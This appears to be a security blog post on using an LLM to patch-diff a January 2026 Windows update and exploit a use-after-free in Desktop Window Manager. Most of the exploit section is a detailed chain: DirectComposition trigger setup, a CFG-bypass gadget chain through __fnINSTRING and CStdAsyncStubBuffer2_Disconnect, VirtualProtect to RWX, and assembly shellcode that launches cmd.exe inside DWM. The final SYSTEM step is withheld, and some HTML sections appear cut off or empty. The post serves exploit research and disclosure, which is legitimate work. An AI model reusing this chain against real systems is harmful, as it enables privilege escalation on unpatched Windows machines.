<p>Patch diffing has long fascinated me. I think part of it has to do with the race against the clock, reversing, exploiting, and trying to attain that “1day” exploit status. For advanced Windows targets, Valentina Palmiotti and Ruben Boonen <a href="https://www.ibm.com/think/x-force/patch-tuesday-exploit-wednesday-pwning-windows-ancillary-function-driver-winsock">proved</a> that this was already possible nearly 3 years ago. But, they are some of the world&#x27;s most talented exploit devs. Can LLMs raise the capability floor for us mere mortals? Fortunately, and maybe a bit alarmingly, the answer is yes.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="the-hunt" class="absolute -top-32"></span>The Hunt</h2>
<p>When the bulletin for the January 2026 Patch Tuesday dropped, I kicked off my search to identify one of the patched vulnerabilities, and (hopefully) develop a working exploit for it. Top on the <a href="https://msrc.microsoft.com/update-guide/releaseNote/2026-Jan">target list</a> were any vulnerabilities already known to be exploited in the wild. January patches included an in-the-wild information leak <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-20805">vulnerability</a> in Desktop Window Manager (DWM), which caught my eye. It also included a second DWM vulnerability which could lead to local privilege escalation. Historically, DWM has been a <a href="https://www.elastic.co/security-labs/itw-windows-lpe-0days-insights-and-detection-strategies">popular target</a> for local privilege escalation. Sometimes it can be tricky to identify the exact patched component, but for DWM, dwmcore.dll is always a safe bet.</p>
<p>After training Ghidra on the files and extracting BSim vectors for every function, it becomes quite easy to highlight the differences between them. Not to mention, many Microsoft-patched vulnerabilities come alongside new feature flags. Needless to say, Opus 4.5 made quick work of the diff and identified one of the vulnerabilities within minutes.</p>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="the-bug-1" class="absolute -top-32"></span>The Bug</h3>
<p>An attacker can:</p>
<ol>
<li>Register a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CSynchronousSuperWetInk</code> with the manager (requires <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LookupMode=2</code> during <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Draw()</code>)</li>
<li>Change <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LookupMode</code> to 0 via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CMD_SET_PROPERTY</code></li>

<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">IsSuperWetCompatible()</code> returns FALSE → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RemoveSource()</code> is <strong>skipped</strong></li>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="the-fix" class="absolute -top-32"></span>The Fix</h3>
<p>The patch adds a feature flag (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Feature_1732988217</code>). <h2 class="font-bold text-2xl md:text-4xl relative"><span id="the-exploit" class="absolute -top-32"></span>The Exploit</h2>
<p>The UAF can be triggered from a regular user-mode application via the <a href="https://learn.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition API</a>. The attack requires no special privileges.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="prerequisites" class="absolute -top-32"></span>Prerequisites</h3>
<ol>
<li><strong>D3D11/DXGI Infrastructure</strong>: Create a D3D11 device with BGRA support and a swap chain for a visible window.</li>
<li><strong>DirectComposition Device</strong>: Initialize via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DCompositionCreateDevice()</code> with the DXGI device.</li>
<li><strong>NtDComposition Syscall Access</strong>: Hook or directly call <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtDCompositionProcessChannelBatchBuffer</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtDCompositionCommitChannel</code> via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">win32u.dll</code> to inject raw batch buffer commands.</li>
</ol>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="trigger-sequence" class="absolute -top-32"></span>Trigger Sequence</h3>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="step-1-create-ink-trail-allocate-csynchronoussuperwetink" class="absolute -top-32"></span>Step 1: Create Ink Trail (Allocate CSynchronousSuperWetInk)</h4>

<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="step-2-create-visual-and-set-lookupmode2" class="absolute -top-32"></span>Step 2: Create Visual and Set LookupMode=2</h4>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="target-function-constraints" class="absolute -top-32"></span>Target Function Constraints</h3>
<p>There are initially two restrictions on what we can call:</p>
<ol>
<li>The target must be <strong>in the CFG bitmap</strong> (marked as valid call target)</li>
<li>The target must have a <strong>pointer to it</strong> (in IAT, vtable, or other readable memory)</li>
</ol>
<p>We cannot directly call arbitrary addresses; only functions that satisfy both conditions.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="gadget-chain-__fninstring--cstdasyncstubbuffer2_disconnect" class="absolute -top-32"></span>Gadget Chain: __fnINSTRING + CStdAsyncStubBuffer2_Disconnect</h3>
<p>With the UAF giving us a controlled vtable call (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RIP = [[spray]+0x50]</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RCX = spray</code>), the remaining challenge is chaining CFG-valid gadgets to achieve arbitrary code execution. Direct shellcode execution is blocked by CFG, and we have no heap address leak. We developed a novel gadget chain that solves both problems to achieve code execution, but it required 2 successful exploit attempts, lowering the reliability. Therefore, we pivoted to a <a href="https://ti.qianxin.com/blog/articles/public-secret-research-on-the-cve-2024-30051-privilege-escalation-vulnerability-in-the-wild-en/">known public</a> technique using two Windows system DLL gadgets: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code> (user32.dll) and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CStdAsyncStubBuffer2_Disconnect</code> (combase.dll).</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="stage-1-__fninstring---kernel-callback-dispatch-without-a-leak" class="absolute -top-32"></span>Stage 1: __fnINSTRING - Kernel Callback Dispatch Without a Leak</h4>
<p>The Windows kernel communicates back to user mode through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">KernelCallbackTable</code> (KCT), a function pointer table stored in the PEB at offset <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x58</code>. Each entry points to a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fn*</code> handler in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user32.dll</code>. These functions are CFG-valid call targets and have pointers to them in readable memory (the KCT itself), satisfying both constraints.</p>
<p>We point the fake vtable at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&amp;KCT[fnINSTRING_index] - 0x50</code>. When DirtyActiveInk dereferences <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[[spray]+0x50]</code>, it reads the KCT entry and dispatches to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code>:</p>
<pre><code>[[spray]+0x50]
  = [KCT_entry_addr - 0x50 + 0x50]
  = [KCT_entry_addr]
  = &amp;__fnINSTRING</code></pre>
<p>What makes this useful is what <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code> does internally. It treats its argument (our spray buffer) as a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_CAPTUREBUF</code> structure and calls <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FixupCallbackPointers</code> before dispatching the inner function. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FixupCallbackPointers</code> reads a fixup table from the buffer and converts relative offsets into absolute addresses by adding the buffer&#x27;s base address:</p>
<pre><code>// Simplified FixupCallbackPointers logic:
void FixupCallbackPointers(_CAPTUREBUF* buf) {
    if (buf-&gt;guard != 0) return;  // already fixed up - skip
    int32_t* fixups = (int32_t*)((char*)buf + buf-&gt;fixupTableOffset);
    for (int i = 0; i &lt; buf-&gt;fixupCount; i++) {
        int32_t* target = (int32_t*)((char*)buf + fixups[i]);
        *(uint64_t*)target += (uint64_t)buf;  // relative → absolute
    }
}</code></pre>
<p>This eliminates the need for a heap address leak. We embed relative offsets in the spray buffer, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FixupCallbackPointers</code> patches them to absolute pointers at runtime using the buffer&#x27;s own address. After fixup, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code> dispatches the inner function pointer at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x48</code> with the arguments at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x28</code> (RCX), <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x30</code> (EDX), <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x38</code> (R8), and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0x50</code> (R9).</p>
<p>We set the inner function to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CStdAsyncStubBuffer2_Disconnect</code>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="stage-2-cstdasyncstubbuffer2_disconnect---two-chained-vtable-calls" class="absolute -top-32"></span>Stage 2: CStdAsyncStubBuffer2_Disconnect - Two Chained Vtable Calls</h4>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CStdAsyncStubBuffer2_Disconnect</code> is exported from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">combase.dll</code>, making it CFG-valid with a stable address. Its disassembly reveals a useful primitive: two sequential vtable dispatches with preserved argument registers:</p>
<pre><code>; CStdAsyncStubBuffer2_Disconnect (simplified)

MOV  RCX, [RCX-8]         ; load [this-8] -&gt; fake_obj_1
TEST RCX, RCX
JZ   skip1
MOV  RAX, [RCX]           ; vtable
MOV  RAX, [RAX+0x20]      ; vtable[4]

XCHG [RBX+0x10], RCX      ; DEFUSE: read [this+0x10], zero it
TEST RCX, RCX
JZ   skip2
MOV  RAX, [RCX]           ; vtable
MOV  RAX, [RAX+0x10]      ; vtable[2]
CALL guard_dispatch_icall  ; CALL #2: [[[this+0x10]]+0x10]  ← shellcode

<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RDX</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">R8</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">R9</code> are <strong>preserved through both calls</strong>, arriving untouched from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code>&#x27;s argument setup. This gives us full control over the first three arguments to both vtable calls.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="vtable-call-1-virtualprotect--rwx" class="absolute -top-32"></span>Vtable Call #1: VirtualProtect → RWX</h4>
<p>We construct a self-referential fake object at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0xC8</code> in the spray buffer: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[+0xC8]</code> points to itself (after fixup), so dereferencing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[RCX] → [RCX+0x20]</code> reads <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">VirtualProtect</code>&#x27;s address from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0xE8</code>. The arguments (preserved from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code> dispatch) are:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th style="text-align:left">Register</th><th style="text-align:left">Value</th><th style="text-align:left">Purpose</th></tr></thead><tbody><tr><td style="text-align:left">RCX</td><td style="text-align:left">base+0xC8 (fake_obj_1)</td><td style="text-align:left">lpAddress (start of spray buffer region)</td></tr><tr><td style="text-align:left">RDX</td><td style="text-align:left">0x1000</td><td style="text-align:left">dwSize</td></tr><tr><td style="text-align:left">R8</td><td style="text-align:left">0x40</td><td style="text-align:left">flNewProtect (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">PAGE_EXECUTE_READWRITE</code>)</td></tr><tr><td style="text-align:left">R9</td><td style="text-align:left">base+0xC0</td><td style="text-align:left">lpflOldProtect (output slot in spray buffer)</td></tr></tbody></table></div>
<p>After this call, the spray buffer&#x27;s memory page is marked RWX, and the CFG bitmap is updated to allow execution from this region.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="vtable-call-2-inline-shellcode" class="absolute -top-32"></span>Vtable Call #2: Inline Shellcode</h4>
<p>After VirtualProtect returns, Disconnect loads <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[this+0x10]</code> into RCX for the second vtable dispatch:</p>
<pre><code>XOR  ECX, ECX
XCHG [RBX+0x10], RCX      ; RCX = [base+0x90] = base+0xA0 (fake_obj_2)
TEST RCX, RCX
JZ   skip2                 ; non-zero → take the call
MOV  RAX, [RCX]            ; RAX = [base+0xA0] = base+0xA8 (fake vtable_2)
MOV  RAX, [RAX+0x10]       ; RAX = [base+0xB8] = base+0xD0 (shellcode!)
CALL guard_dispatch_icall   ; call base+0xD0</code></pre>
<p>The pointer chain resolves step by step:</p>
<ol>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[this+0x10]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[base+0x90]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base+0xA0</code> (fake_obj_2)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[RCX]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[base+0xA0]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base+0xA8</code>, fake_obj_2&#x27;s vtable pointer (after fixup)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[RAX+0x10]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[base+0xB8]</code> = <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base+0xD0</code>, vtable_2&#x27;s third entry, pointing at our shellcode</li>
</ol>
<p>The final <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CALL guard_dispatch_icall</code> dispatches to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base+0xD0</code>, our inline shellcode, now both executable and CFG-valid thanks to the preceding VirtualProtect call.</p>
<h5 class="eyebrow relative"><span id="shellcode-layout" class="absolute -top-32"></span>Shellcode Layout</h5>
<p>The shellcode is split into two phases because the VirtualProtect address data sits at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0xE8</code> (used as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vtable_1[0x20]</code> by call #1), creating a gap in the middle of our executable region:</p>
<p><strong>Phase 1 (+0xD0, 22 bytes):</strong> Saves <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RCX</code> (base+0xA0) into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RBX</code> for later address arithmetic, allocates shadow space, loads <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SW_SHOW</code> (5) into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RDX</code>, loads the absolute address of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WinExec</code> via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">movabs RAX</code>, then jumps over the 8-byte data gap at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">+0xE8</code>:</p>
<pre><code>mov  rbx, rcx              ; save base+0xA0 for address math
sub  rsp, 0x28             ; shadow space
push 5
pop  rdx                   ; uCmdShow = SW_SHOW
movabs rax, &lt;WinExec addr&gt; ; 10-byte immediate load
jmp  +0x0A                 ; skip over +0xE8 data → land at +0xF0</code></pre>
<p><strong>Phase 2 (+0xF0):</strong> Calls <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WinExec</code> with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RIP</code>-relative pointer to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;cmd.exe\0&quot;</code> string embedded at the end of the shellcode, defuses the spray for safe re-entry, then performs a stack fixup to return directly to DWM&#x27;s composition loop:</p>
<pre><code>lea  rcx, [rip+0x22]      ; rcx = &amp;&quot;cmd.exe&quot;
call rax                   ; WinExec(&quot;cmd.exe&quot;, SW_SHOW)

; Defuse: rewrite fake vtable so re-entry is harmless
lea  rax, [rbx+0x78]       ; rax = address of the ret below
mov  [rbx-0x48], rax       ; [base+0x58] = ret_gadget
lea  rax, [rbx-0x98]       ; rax = base+0x08
mov  [rbx-0xA0], rax       ; [base+0x00] = base+0x08 (new fake vtable)

; Stack fixup: skip Disconnect + __fnINSTRING return frames
add  rsp, 0xB8             ; 0x28 shadow + 0x90 to unwind past intermediate frames
xor  eax, eax              ; zero return value
ret                        ; return directly to DWM composition loop
; &quot;cmd.exe\0&quot; embedded here</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">add rsp, 0xB8</code> improves reliability. A naive <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">add rsp, 0x28</code> would return into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CStdAsyncStubBuffer2_Disconnect</code>, which would then return into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code>, which calls <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtCallbackReturn</code>. This kernel callback return path can be fragile in the context of a hijacked call. By adding an extra <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x90</code> to the stack adjustment, the shellcode skips past both intermediate frames entirely and returns directly to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DirtyActiveInk</code>&#x27;s caller in the DWM composition loop.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="safe-re-entry-defusing-the-spray" class="absolute -top-32"></span>Safe Re-entry: Defusing the Spray</h4>
<p>DWM&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DirtyActiveInk</code> may iterate the dangling pointer more than once. Without defusing, each re-entry would re-trigger the full chain and crash. The shellcode rewrites the spray&#x27;s vtable pointer so that subsequent dereferences take a harmless path:</p>
<ol>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[base+0x00]</code> is overwritten to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base+0x08</code> (new fake vtable)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[base+0x58]</code> is overwritten to the address of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ret</code> instruction</li>
</ol>
<p>On re-entry: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[[base+0x00]+0x50] = [base+0x08+0x50] = [base+0x58] = ret</code>. The vtable call returns immediately. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__fnINSTRING</code> is never re-invoked because the vtable no longer points at the KCT entry.</p>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="full-chain-summary" class="absolute -top-32"></span>Full Chain Summary</h3>
<pre><code>DirtyActiveInk iterates dangling pointer
  → [[spray+0x00]+0x50] = __fnINSTRING(spray)
    → FixupCallbackPointers: 8 relative offsets → absolute
    → Dispatch: CStdAsyncStubBuffer2_Disconnect(base+0x80, 0x1000, 0x40, base+0xC0)
      → Vtable call #1: VirtualProtect(base+0xC8, 0x1000, RWX, base+0xC0)
        → Spray buffer page is now RWX, CFG bitmap updated
      → Vtable call #2: shellcode at base+0xD0
        → WinExec(&quot;cmd.exe&quot;, SW_SHOW)
        → Defuse: rewrite vtable for safe re-entry
        → Stack fixup: add rsp, 0xB8 to skip Disconnect + __fnINSTRING frames
      → RET directly to DWM composition loop
    → DirtyActiveInk re-entry: [[base]+0x50] = ret → clean return</code></pre>
<p>The DWM process runs as the DWM user with System integrity. Prior <a href="https://ti.qianxin.com/blog/articles/public-secret-research-on-the-cve-2024-30051-privilege-escalation-vulnerability-in-the-wild-en/">public techniques</a> to achieve SYSTEM typically involve hijacking function pointers mapped into privileged client processes like LogonUI or Consent. However, it appears this technique was recently patched as the shared section is now mapped read-only. We developed a new, alternative path to SYSTEM but are choosing to withhold publishing the technique at this time.</p>

<h2 class="font-bold text-2xl md:text-4xl relative"><span id="closing-thoughts" class="absolute -top-32"></span>Closing Thoughts</h2>
<p>The models we have today are highly capable at tasks that historically have required deep expertise cultivated over many years. This includes things like reverse engineering, vulnerability discovery, and exploit development. Their capabilities are spiky, and do not yet rival the world&#x27;s best in these fields. However, the march of model progress seems to show no sign of slowing down at the moment. This levels the playing field for defenders, but also raises the capabilities of attackers. While there has always been an adversarial cat and mouse game, and this is not new in that regard, attackers are at least at a near-term asymmetric advantage to wield these tools for harm. Attackers can move faster, with little worry about safety or security of AI systems. Defenders must leverage AI for offensive purposes against their code (for vulnerabilities), security products (for detection gaps), and their enterprises (adversary emulation) to find weaknesses and iterate on improved defenses before attackers do. Unfortunately, it may be the small organizations with no security teams that take the brunt of the near term pain. My hope is that long-term, the security community can together outspend attackers on offensive and defensive research, and we exit this era in a better place than we started.</p></div></div></div><div
